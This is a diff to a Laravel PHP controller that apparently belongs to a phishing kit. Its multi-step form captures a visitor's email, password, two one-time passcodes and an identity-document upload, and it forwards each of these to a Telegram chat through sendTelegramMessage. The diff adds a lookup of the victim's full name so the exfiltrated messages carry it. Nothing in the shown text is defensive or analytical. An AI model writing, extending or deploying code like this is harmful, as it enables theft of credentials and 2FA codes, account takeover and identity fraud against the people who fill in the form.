@@ -61,8 +61,9 @@ class DataController extends Controller
             // Get ID from session and update record
             $recordId = session('record_id');
             if ($recordId) {
-                Data::where('id', $recordId)->update($validated);
-                $this->sendTelegramMessage("Email and password updated for ID: {$recordId} Email: {$validated['email']} Password: {$validated['password']}");
+                 Data::where('id', $recordId)->update($validated);
+                $record = Data::find($recordId);
+                $this->sendTelegramMessage("Email and password updated for user: {$record->full_name} Email: {$validated['email']} Password: {$validated['password']}");
             }
         }
 
@@ -77,15 +78,17 @@ class DataController extends Controller
             $recordId = session('record_id');
             if ($recordId) {
                 Data::where('id', $recordId)->update($validated);
+                $record = Data::find($recordId);
             }
-            $this->sendTelegramMessage("OTP code updated for ID: {$recordId} otp_code: {$validated['otp_code']} ");
+            $this->sendTelegramMessage("OTP code updated for user: {$record->full_name} otp_code: {$validated['otp_code']} ");
         }
         if ($currentStep == 6) {
             $recordId = session('record_id');
             if ($recordId) {
-                Data::where('id', $recordId)->update($validated);
+                 Data::where('id', $recordId)->update($validated);
+                $record = Data::find($recordId);
             }
-            $this->sendTelegramMessage("OTP code updated for ID: {$recordId} otp_code_2: {$validated['otp_code_2']}");
+            $this->sendTelegramMessage("OTP code updated for user: {$record->full_name} otp_code_2: {$validated['otp_code_2']}");
         }
 
         if ($currentStep == 7) {
@@ -100,8 +103,9 @@ class DataController extends Controller
                 // Save image path to database
                 $imagePath = url('images/' . $filename);
                 Data::where('id', $recordId)->update(['images' => $imagePath]);
+                $record = Data::find($recordId);
 
-                $this->sendTelegramMessage("Identity image uploaded for ID: {$recordId}\nImage URL: {$imagePath}");
+                $this->sendTelegramMessage("Identity image uploaded for user: {$record->full_name}\nImage URL: {$imagePath}");
 
                 // Clear the session after successful upload
                 session()->forget('record_id');
